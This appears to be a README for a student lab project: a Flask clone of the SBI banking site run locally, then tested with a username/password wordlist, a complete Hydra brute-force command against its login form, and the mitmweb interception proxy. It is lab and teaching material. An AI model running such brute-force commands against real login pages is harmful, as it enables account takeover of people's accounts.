<h1 align="center">🏦 SBI Clone Bank</h1>
<p align="center">
  <b>Web Application + Security Testing Project</b><br>
  <i>Flask • Cybersecurity • Brute Force • MITM</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.12-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Flask-Web%20App-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/Security-Testing-red?style=for-the-badge">
</p>

---

## 📌 Overview
This project is a simulated banking web application used to demonstrate real-world security testing techniques such as brute-force attacks and MITM interception.

---

## 🚀 Execution Steps

### 🖥️ Part 1: Run Website
```bash
# Open WSL terminal
cd ~/sbi-clone-bank
source venv/bin/activate
python3 app.py
```

🌐 Access:
```
http://172.31.249.114:5000
```

---

## 🔐 Wordlist Creation
```bash
# Create fresh wordlists
cat > users.txt << 'EOF'
rajesh.kumar
priya.sharma
amit.patel
admin
administrator
user
test
john
EOF

cat > passwords.txt << 'EOF'
Rajesh@123
Priya@456
Amit@789
password
123456
admin123
welcome
qwerty
letmein
Password1
Admin123
Welcome@123
EOF
```

---

## 📊 Combination Calculation
```bash
users=$(wc -l < users.txt)
pass=$(wc -l < passwords.txt)
total=$((users * pass))
echo "Testing $users usernames × $pass passwords = $total combinations"
echo "=================================="
echo ""
```

---

## 💣 Brute Force Attack (Hydra)
```bash
hydra -L /home/umar_ali/users.txt \
      -P /home/umar_ali/passwords.txt \
      -t 4 \
      -f \
      -o /home/umar_ali/hydra-results.txt \
      -V \
      172.31.249.114 \
      -s 5000 \
      http-post-form \
      "/login:username=^USER^&password=^PWD^:F=Invalid username or password"
```

---

## 📄 View Results
```bash
cat hydra-results.txt
```

---

## 🕵️ MITM Proxy
```bash
mitmweb.exe
```

🌐 Access:
```
http://172.31.249.114:5000
```

---

## 📂 Project Structure
```
sbi-clone-bank/
│
├── app.py
├── templates/
├── static/
├── data/
├── .gitignore
└── README.md
```

---

## ⚠️ Disclaimer
This project is created strictly for educational purposes and security testing in a controlled environment.


